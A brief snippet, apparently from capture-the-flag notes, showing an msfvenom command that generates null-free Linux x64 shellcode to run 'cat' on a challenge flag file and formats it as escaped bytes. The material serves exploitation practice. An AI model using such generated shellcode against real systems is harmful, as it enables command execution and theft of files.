Available in Meterpreter

MsfVenom can be use to craft a payload
msfvenom -b '\x00' -p linux/x64/exec CMD="/bin/cat /flag/level1.flag" | hexdump -ve '1/1 "\\/x%.2x"' 
